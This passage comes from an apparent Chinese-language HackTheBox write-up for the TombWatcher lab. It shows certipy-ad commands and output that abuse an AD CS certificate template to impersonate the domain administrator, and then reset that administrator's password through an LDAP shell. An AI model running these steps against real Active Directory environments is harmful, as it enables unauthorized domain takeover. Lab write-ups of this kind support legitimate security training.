net stop certsvc && net start certsvc
```

- **警告**: 可能影响合法证书请求，需充分测试。  

---

我们使用场景A：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'passwd@123' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

修改管理员密码：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell             
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# change_password administrator passwd@123
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: passwd@123
Password changed successfully!
```

成功winrm


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/31b9681fc4ce4387b0be508db5e901ef.png)


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a2c9c0b6eda44a83beb9d9a654604cdc.png)

## wp

[HTB 靶机 TombWatcher Write-up（Medium)](https://blog.csdn.net/qq_45203884/article/details/148551060)
[HTB-TombWatcher](https://www.hyhforever.top/posts/2025/06/htb-tombwatcher/)
[HTB TombWatcher靶场：从ACL滥用到证书漏洞拿下域控](https://blog.csdn.net/PEIWIN/article/details/148583927)
[HTB 赛季8靶场 - TombWatcher](https://blog.csdn.net/weixin_44368093/article/details/148564737)
